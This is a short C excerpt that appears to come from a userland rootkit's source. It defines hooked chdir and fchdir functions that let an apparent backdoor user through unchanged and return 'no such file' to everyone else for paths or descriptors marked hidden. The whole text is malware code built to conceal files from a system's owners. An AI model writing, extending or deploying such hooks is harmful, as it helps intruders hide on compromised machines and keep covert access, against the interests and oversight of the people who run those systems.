int chdir(const char *pathname){
    hook(CCHDIR);
    if(is_bdusr()) return (long)call(CCHDIR, pathname);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CCHDIR, pathname);
}

int fchdir(int fd){
    hook(CFCHDIR);
    if(is_bdusr()) return (long)call(CFCHDIR, fd);
    if(hidden_fd(fd)) { errno = ENOENT; return -1; }
    return (long)call(CFCHDIR, fd);
}
